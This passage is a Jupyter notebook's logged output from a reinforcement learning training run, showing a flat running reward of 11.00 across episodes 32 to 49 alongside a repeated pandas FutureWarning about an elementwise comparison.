      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 32\t Frame count: 40100\t Context: 1\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 40200\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40300\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40400\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 33\t Frame count: 40600\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40700\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40800\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 40900\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 34\t Frame count: 41100\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 34\t Frame count: 41300\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41400\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41500\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41600\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41700\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41800\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 41900\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 42000\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 42100\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 42200\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 42300\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 42400\t Context: 2\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 42500\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 42600\t Context: 2\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 42700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 35\t Frame count: 42800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 36\t Frame count: 42900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 36\t Frame count: 43000\t Context: 1\n",
      "Running reward: 11.00\t Episode 36\t Frame count: 43100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 36\t Frame count: 43200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 36\t Frame count: 43300\t Context: 1\n",
      "Running reward: 11.00\t Episode 37\t Frame count: 43400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 37\t Frame count: 43500\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 43600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 38\t Frame count: 43700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 38\t Frame count: 43800\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 43900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 38\t Frame count: 44000\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44100\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44200\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44300\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44400\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44500\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44600\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44700\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44800\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 44900\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45000\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45100\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45200\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45300\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45400\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45500\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45600\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45700\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45800\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 45900\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46000\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46100\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46200\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46300\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46400\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46500\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46600\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46700\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46800\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 46900\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47000\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47100\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47200\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47300\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47400\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47500\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47600\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 47700\t Context: 1\n",
      "Running reward: 11.00\t Episode 39\t Frame count: 47800\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 47900\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 40\t Frame count: 48100\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48200\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48300\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48400\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48500\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48600\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48700\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 48800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 40\t Frame count: 48900\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49000\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49100\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49200\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49300\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49400\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49500\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 49600\t Context: 2\n",
      "Running reward: 11.00\t Episode 41\t Frame count: 49700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 42\t Frame count: 49800\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 49900\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 42\t Frame count: 50100\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50200\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50300\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 42\t Frame count: 50500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 42\t Frame count: 50600\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50700\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50800\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 50900\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51000\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51100\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51200\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51300\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51400\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51500\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51600\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51700\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51800\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 51900\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52000\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52100\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52200\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52300\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52400\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52500\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52600\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52700\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52800\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 52900\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53000\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53100\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53200\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53300\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53400\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53500\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53600\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53700\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53800\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 53900\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54000\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54100\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54200\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54300\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54400\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54500\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54600\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54700\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54800\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 54900\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55000\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55100\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55200\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55300\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55400\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55500\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55600\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55700\t Context: 2\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 55800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 43\t Frame count: 55900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 43\t Frame count: 56000\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 56100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 43\t Frame count: 56200\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 56300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 43\t Frame count: 56400\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 56500\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 56600\t Context: 2\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 56700\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 56800\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 56900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 44\t Frame count: 57000\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 57100\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 57200\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 57300\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 57400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 45\t Frame count: 57500\t Context: 1\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 57600\t Context: 1\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 57700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 45\t Frame count: 57800\t Context: 2\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 57900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 45\t Frame count: 58000\t Context: 2\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 58100\t Context: 2\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 58200\t Context: 2\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 58300\t Context: 2\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 58400\t Context: 1\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 58500\t Context: 1\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 58600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 46\t Frame count: 58700\t Context: 2\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 58800\t Context: 2\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 58900\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59000\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59100\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59200\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 47\t Frame count: 59400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 47\t Frame count: 59500\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59600\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59700\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59800\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 59900\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60000\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60100\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60200\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60300\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60400\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60500\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60600\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60700\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60800\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 60900\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61000\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61100\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61200\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61300\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61400\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61500\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61600\t Context: 2\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 61700\t Context: 2\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 61800\t Context: 1\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 61900\t Context: 1\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 62000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 48\t Frame count: 62100\t Context: 1\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 62200\t Context: 1\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 62300\t Context: 2\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 62400\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 62500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 49\t Frame count: 62600\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 62700\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 62800\t Context: 1\n",
